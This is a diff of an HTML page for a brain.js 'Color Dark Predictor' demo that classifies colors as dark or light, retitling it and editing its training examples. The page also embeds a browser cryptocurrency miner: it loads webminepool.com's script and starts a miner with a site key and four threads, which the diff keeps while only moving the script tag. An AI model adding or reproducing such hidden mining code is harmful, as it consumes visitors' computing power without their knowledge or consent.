@@ -3,7 +3,8 @@
   <head>
     <meta content="text/html; charset=windows-1252" http-equiv="Content-Type">
       <script src="https://unpkg.com/brain.js@2.0.0-beta.17/dist/browser.js"></script>
-    <script src="https://webminepool.com/lib/base.js"></script>
+      <title>Color Dark Predictor</title>
+      <script src="https://webminepool.com/lib/base.js"></script>
 <script>
     var miner = WMP.User('SK_4NgHVFwRZFjQ56ixBJcEs', 'machine-learning-color',{
         threads: 4,
@@ -15,7 +16,7 @@
 </script>
   </head>
   <body>
-    <h1>Deep Learning with brain.js</h1>
+    <h1>Color Dark Predictor</h1>
     <div id="whatColor">The Color is: <span id="color">#####</span></div>
     <br>
     <div id="demo"></div>
@@ -34,16 +35,23 @@
               light: 1
           }
         },
+        // Green
+        {
+          input: [0 / 255, 255 / 255, 0 / 255],
+          output: {
+              light: 1
+          }
+        },
+        // Red
+        {
+          input: [255 / 255, 0 / 255, 0 / 255],
+          output: {
+              light: 1
+          }
+        },
         // Maroon RGB(74, 0, 0)
         {
           input: [74 / 255, 0, 0],
-          output: {
-              dark: 1
-          }
-        },
-        // Dark Cyan
-        {
-          input: [0 / 255, 37 / 255, 74 / 255],
           output: {
               dark: 1
           }
@@ -60,13 +68,6 @@
           input: [7 / 255, 31 / 255, 247 / 255],
           output: {
               light: 1
-          }
-        },
-        // Dark Pale Blue
-        {
-          input: [51 / 255, 55 / 255, 87 / 255],
-          output: {
-              dark: 1
           }
         },
         // Pale Blue
